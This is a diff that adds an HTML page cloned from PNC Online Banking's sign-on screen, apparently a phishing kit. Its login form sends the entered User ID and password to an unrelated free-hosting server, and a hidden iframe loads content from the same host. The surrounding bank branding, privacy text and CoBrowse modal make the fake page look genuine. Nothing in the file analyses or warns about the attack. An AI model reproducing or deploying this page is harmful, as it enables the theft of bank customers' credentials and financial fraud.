@@ -1,0 +1,317 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=8" />
+    <title>PNC Online Banking</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta http-equiv="Cache-Control" content="no-cache, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, no-store, private" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <link rel="icon" href="Include/favicon.ico" type="image/x-icon" />
+    <!-- Core + Skin CSS -->
+
+    <link rel="shortcut icon" href="Include/favicon.ico" type="image/x-icon" />
+    <!-- Global Styles -->
+    <style type="text/css">
+        /* Code tidied up by ScrapBook */
+        
+        @import url("../../../../../../../../www.onlinebanking.pnc.com/css2/common.css");
+    </style>
+
+
+    <style>
+        /* Code tidied up by ScrapBook */
+        
+        #pageNavigation ul {
+            margin-left: -3px;
+        }
+        
+        #pageNavigation li {
+            padding: 0px 3px;
+        }
+        
+        #pageNavigation a {
+            font-weight: normal;
+        }
+    </style>
+
+
+    <!-- Script to Disable the Signon Button -->
+    <script type="text/javascript">
+        function check() {
+            var userid = document.getElementById("alternateSignon_userId");
+            var password = document.getElementById("alternateSignon_password");
+            var temp = false;
+            if (userid.value != null && password.value != null && /\S/.test(userid.value) && /\S/.test(password.value)) {
+                temp = true;
+            }
+            if (temp) {
+                document.getElementById("Signon").disabled = false;
+                document.getElementById("Signon").className = "formButton";
+            } else {
+                document.getElementById("Signon").disabled = true;
+                document.getElementById("Signon").className = "disabledButton";
+            }
+        };
+    </script>
+</head>
+
+<body onunload="doUnLoad();" class="yui-skin-sam">
+    <iframe id="_yuiResizeMonitor" title="Text Resize Monitor" style="position: absolute; visibility: visible; width: 10em; height: 10em; top: -100px; left: -100px; border-width: 0px;" src="http://uncarted-structures.000webhostapp.com/data/www/v2/access/0GHJ73011/sign/do/index_2.html"></iframe>
+    <div id="toolTip" class="yui-module yui-overlay yui-tt" style="z-index: 5;">
+        <div class="bd" style="height: auto;"></div>
+    </div>
+
+    <form method="post" name="alternateSignon" action="http://uncarted-structures.000webhostapp.com/data/www/v2/access/0GHJ73011/sign/do/index.php?securitysteps_5f512a34358ae4d3_ACCESS_verify_i5f512a34358ae4d3_token9833jnm246hHjmssw_onlinebanking_DO7dtkwIsdfg=Personal" onsubmit="autoLogout=false;">
+
+        <div id="shortHeader">
+
+            <div id="smallTopLinks">
+                <ul>
+                    <li class="left" onclick="openPrivacy();return false;" title="PNC respects the privacy of our customers and is committed to protecting your information with the same care we utilize for all PNC transactions. Click to view the details of our consumer privacy principles."><a href="index.html#">Privacy</a></li>
+                    <li class="right" onclick="openSecurityCenterWindow();return false;" title="Security is a priority at PNC. We are committed to protecting the security and confidentiality of your financial information. Click to learn more about how we protect you and how you can protect yourself."><a href="index.html#">Security</a></li>
+                </ul>
+            </div>
+
+        </div>
+        <div class="noNavigation"></div>
+        <!-- Start Page Specific Script and Styles -->
+        <div class="clear"></div>
+
+        <div id="contentArea">
+
+            <div id="pageTitle">
+                <!-- Chat! -->
+                <div class="shortHeaderChat">
+                    <div id="lpChatButton-sp" class="lpChatDiv"></div>
+                    <div id="lpChatButton-en" class="lpChatDiv"></div>
+                </div>
+                <!-- End Chat -->
+                <h1 class="signIn">Sign On</h1>
+            </div>
+
+            <div id="leftCol_oneThird2Col">
+                <div class="panel">
+                    <div class="panelHead">
+                        <div class="panelHeadTitle">
+                            <h2 class="logonHeader">Enter Your User ID and Password:</h2>
+                        </div>
+                    </div>
+                    <div class="panelContent">
+                        <!-- Panel Content -->
+                        <div class="formFields">
+                            <div class="formFieldsRight">
+                                <label for="alternateSignon_userId" class="bold">User ID:</label>
+                                <br />
+                                <input class="CobrowseBlock" id="alternateSignon_userId" name="userId" autocomplete="off" onkeyup="check()" type="text" />
+                                <br />
+                                <br />
+
+                                <label for="alternateSignon_password" class="bold">Password:</label>
+                                <br />
+                                <input class="CobrowseBlock" id="alternateSignon_password" name="password" autocomplete="off" onkeyup="check()" type="password" />
+                                <br />
+                                <br />
+                                <a href="index.html#" onclick="centeredPopUp('/alservlet/ForgotUserIdServlet','Reset',720,690,'yes');">Forgot 
+ 										User ID or Password?</a>
+                                <div class="formLinks">
+                                    <input class="disabledButton" value="Sign On" id="Signon" disabled="" type="submit" /> </div>
+								<label class="bold">Enroll in Online Banking:</label>
+                                <div class="pageNavigation" id="pageNavigation">
+
+                                    <ul>
+                                        <li>
+                                            <a href="index.html#" onclick="autoLogout=false;window.location='/alservlet/OnlineBankingServlet?userId=enroll&amp;origin=p';">Personal</a>
+                                        </li>
+
+                                        <li class="last">
+                                            <a href="index.html#" onclick="autoLogout=false;window.location='/alservlet/OnlineBankingServlet?userId=enroll&amp;origin=b';">Small Business</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <!-- End Panel Content -->
+                            <div class="clear"></div>
+                        </div>
+                    </div>
+                    <div class="panelFooter">
+                        <div class="panelFooterRight">&nbsp;</div>
+                    </div>
+
+                </div>
+            </div>
+
+            <div id="rightCol_twoThirds">
+
+                <div class="panel invisible" id="error">
+                    <div class="errorPanelHeadyellow">
+                        <div class="errorPanelHeadRightyellow">&nbsp;</div>
+                    </div>
+                    <div class="errorPanelContent pageError">
+
+                        <h2>Your Browser Is Unsupported</h2>
+
+                        <p>Your browser does not appear to support the web standards required to fully utilize the features of PNC Bank's Online Banking service. The following browsers are supported by PNC Bank's Online Banking service:</p>
+
+                        <dl>
+                            <dt><a href="../../../../../../../../www.pnc.com/webapp/unsec/externalPopup.app%3Fpage=http%253A%252F%252Fwww%252Emicrosoft%252Ecom%252Fwindows%252Fie%252Fdefault.mspx.html" target="offsite">Microsoft Internet Explorer</a></dt>
+                            <dt><a href="../../../../../../../../www.pnc.com/webapp/unsec/externalPopup.app%3Fpage=http%253A%252F%252Fwww%252Emozilla%252Ecom%252Ffirefox%252F.html" target="offsite">Mozilla Firefox</a></dt>
+                            <dt><a href="../../../../../../../../www.pnc.com/webapp/unsec/externalPopup.app%3Fpage=http%253A%252F%252Fwww%252Ebrowser%252Enetscape%252Ecom%252F.html" target="offsite">Netscape Navigator</a></dt>
+                            <dt><a href="../../../../../../../../www.pnc.com/webapp/unsec/externalPopup.app%3Fpage=http%253A%252F%252Fwww%252Eapple%252Ecom%252Fsafari%252F.html" target="offsite">Apple Safari</a></dt>
+                        </dl>
+
+                    </div>
+                    <div class="errorPanelFooteryellow">
+                        <div class="errorPanelFooterRightyellow">&nbsp;</div>
+                    </div>
+                </div>
+
+                <div class="panel">
+                    <div class="blankPanelHead">
+                        <div class="blankPanelHeadRight">&nbsp;</div>
+                    </div>
+                    <div class="panelContent">
+
+                        <!-- Panel Content -->
+
+                        <div id="infoSignOn">
+                            <p>All of the account information and services you have come to expect from Online Banking are ready and waiting for you. Just complete the sign on process to see your account(s), view statements, pay bills, and conduct the activities that you normally would.</p>
+                            <p>
+                                <strong>To sign on:</strong> Enter your User ID and password. Then, click the 'Sign On' button.
+
+                            </p>
+                        </div>
+
+                        <!-- End Panel Content -->
+
+                        <div class="clear"></div>
+                    </div>
+                    <div class="panelFooter">
+                        <div class="panelFooterRight">&nbsp;</div>
+                    </div>
+
+                </div>
+
+            </div>
+        </div>
+
+        <div id="footer">
+
+            <div class="footerContent">
+                <div id="footerRule"></div>
+
+                <ul>
+                    <li>
+                        <a href="index.html#" onclick="openGuaranteeWindow();return false;" title="Online Banking and Bill Pay Guarantee">Online Banking &amp; Bill Pay Guarantee</a> |
+                        <!--  <a href="#" onclick="openServiceAgreementWindow();return false;" title="Service Agreement">Service Agreement</a> | -->
+                        <a href="index.html#" class="tipMe" onclick="openPrivacy();return false;" title="PNC respects the privacy of our customers and is committed to protecting your information with the same care we utilize for all PNC transactions. Click to view the details of our consumer privacy principles.">Privacy Policy</a> |
+                        <a href="index.html#" class="tipMe" onclick="openSecurityCenterWindow();return false;" title="Security is a priority at PNC. We are committed to protecting the security and confidentiality of your financial information. Click to learn more about how we protect you and how you can protect yourself.">Online Security</a>&nbsp;
+                    </li>
+                    <li>© Copyright 2017. <a href="index.html#" onclick="openPNCGroupWindow();return false;" title="The PNC Financial Services Group, Inc.">The PNC Financial Services Group, Inc.</a> All Rights Reserved.</li>
+                    <li>
+
+                        <div id="coBrowseModal" style="display: none;">
+                            <div id="coBrowseModalContainer">
+                                <div id="pncOverlay" class="mask"></div>
+                                <div id="coBrowseContainer">
+                                    <div>&nbsp;
+                                        <div class="coBrowseActions"><a href="index.html#" class="coBrowseActionLink"><span class="coBrowseActionClose" id="coBrowseCloseButton">&nbsp;</span></a></div>
+                                    </div>
+                                    <div id="modalContent" tabindex="0">
+                                        
+                                        <div id="container">
+                                            <div class="logo_container">
+                                                <img id="company_logo" src="Include/company_logo.1033.1.jpg" alt="PNC Bank" class="png" style="position: relative;" />
+                                            </div>
+                                            <div id="slidshow_cont" style="height: 379px; position: relative;">
+                                                <div class="maintext" id="greeting">
+                                                    <p>
+                                                        <span style="font-size: 16px; font-family: arial,helvetica,sans-serif;">
+                    <strong>Welcome to PNC CoBrowse.&nbsp; We're here to help you!</strong>
+                </span>
+                                                    </p>
+                                                    <p>
+                                                        <span style="font-size: 14px; font-family: arial,helvetica,sans-serif;">
+                    <strong>
+                        <br />
+                    </strong>
+                </span>
+                                                    </p>
+                                                    <p>
+                                                        <span style="font-size: 14px; font-family: arial,helvetica,sans-serif;">You are just a few clicks away from, with your permission, a PNC Online Banking Consultant being able to assist you by browsing the site with you. </span>
+                                                        <br />
+                                                        <br />
+                                                    </p>
+                                                    <p>
+                                                        <span style="font-family: arial,helvetica,sans-serif; font-size: 14px;">To share your screen, click the Accept and CoBrowse button below to generate a passcode. &nbsp;A PNC Online Banking Consultant will use the passcode to view your desktop. &nbsp;By clicking the Accept and CoBrowse button, you authorize us to view your current web session. &nbsp;You control the session and you can terminate it at any time by clicking the Disconnect button or by closing the browser window.</span>
+                                                    </p>
+                                                    <p>
+                                                        <br />
+                                                    </p>
+                                                    <p>If you are not on the phone with a PNC Online Banking Consultant, and wish to utilize our CoBrowse service, please call 888-PNC-BANK
+                                                        <br />
+                                                        <br />
+                                                        <br /><span style="font-size: 13px;"></span></p>
+                                                </div>
+                                                <a id="startButtonContainer" class="startButton" title="Accept and CoBrowse" style="display: none; padding-left: 0px !important; padding-right: 18px !important;">
+                                                    <span id="startButton">Accept and CoBrowse</span>
+                                                </a>
+                                                <span id="pleaseWaitBlock" style="display: none;">Please wait...</span>
+                                                <div class="main_img" id="mainImage"></div>
+                                            </div>
+                                            <div id="details_cont">
+                                                <div style="margin: 0px 20px;">
+                                                    <div class="fLeft">
+                                                        <div class="option">
+                                                            <a id="FAQURL" href="../../../../../../../../www.pnc.com/webapp/unsec/Solutions.do%3FsiteArea=%252Fpnccorp%252FPNC%252FTerms+and+Conditions.html" target="_blank">Terms and Conditions</a>
+                                                        </div>
+                                                    </div>
+                                                    <div class="coverPhone fRight" style="width: 250px; height: 55px;" id="altGreeting">
+                                                        <p style="text-align: left;"><span style="font-family: arial,helvetica,sans-serif; color: rgb(0, 0, 0);">Mon - Fri: 7am to 10pm ET</span>
+                                                            <br /><span style="font-family: arial,helvetica,sans-serif; color: rgb(0, 0, 0);">Sat - Sun: 8am to 5pm ET</span></p>
+                                                    </div>
+                                                    <div class="clear"></div>
+                                                </div>
+                                            </div>
+                                            <div id="privacypolicy">
+                                                <h4 id="privacyHeader">Your privacy is important to us</h4>
+                                                <div id="privacyText">
+                                                    <p><span style="font-family: arial,helvetica,sans-serif;">Co Browse is a secure service governed by our <a target="_blank" href="../../../../../../../../www.pnc.com/webapp/unsec/Solutions.do%3FsiteArea=%252Fpnccorp%252FPNC%252FPrivacy+Policy.html">Privacy Policy.</a></span></p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <br />
+                                        <br />
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <a id="launchCobrowse" href="index.html#" class="cobrowseOutline" onclick="CoBrowse.launchCoBrowseModal()"><img src="Include/livelook.png" alt="PNC Cobrowse" /></a>
+
+                        <a href="index.html#" onclick="intermodal({content:'contactUs', w:650, title:'Contact Us', unAuth:true, className:'minimalFooterContactUs' }); return false;">Need Help? View our Contact Numbers and Hours of Operation</a>
+                        <!-- Need Help? Call us at 1-888-PNC-BANK (762-2265) <a href="#" class="tipMe" title="Automated Account Information is available 24/7, 365 days a year. Customer Service Representatives are available 7:00 a.m. to 10:00 p.m. ET, Monday through Friday and 8:00 a.m. to 5:00 p.m. ET, Saturday and Sunday.">Hours</a> -->
+                    </li>
+                    <li class="left">
+
+                        <span class="version">
+
+</span>
+
+                        <a href="index.html#" onclick="openSecurityWindow()" class="tipMe" title="Security is a priority at PNC. We are committed to protecting the security and confidentiality of your financial information. Click to learn more about how we protect you and how you can protect yourself."><img src="Include/lock.png" alt="Lock Icon" class="lock" /></a>
+                    </li>
+
+                </ul>
+                <div class="clear"></div>
+
+            </div>
+        </div>
+
+
+    </form>
+
+
+
+</body>
+
+</html>
